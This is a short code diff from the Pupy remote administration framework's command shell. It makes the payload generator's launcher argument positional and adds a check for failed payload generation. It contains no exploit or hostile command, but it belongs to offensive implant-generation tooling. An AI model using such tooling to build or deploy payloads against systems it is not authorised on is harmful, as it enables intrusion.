@@ -786,8 +786,8 @@ class PupyCmd(cmd.Cmd):
             default_arch=default_arch,
             default_format=default_format
         )
-        arg_parser.add_argument('-L', '--launcher', default='connect', help='Launcher')
         arg_parser.add_argument('-t', '--transport', default=self.pupsrv.transport, help='Transport')
+        arg_parser.add_argument('launcher', nargs='?', default='connect', help='Launcher')
         arg_parser.add_argument(
             'launcher_args', nargs=REMAINDER,
             default=self.pupsrv.transport_kwargs, help='Transport args'
@@ -809,6 +809,10 @@ class PupyCmd(cmd.Cmd):
             output = pupygen.pupygen(args)
         except Exception, e:
             self.display_error('payload generation failed: {}'.format(e))
+            return
+
+        if not output:
+            self.display_error('payload generation failed')
             return
 
         if self.pupsrv.httpd and output.startswith(wwwroot):
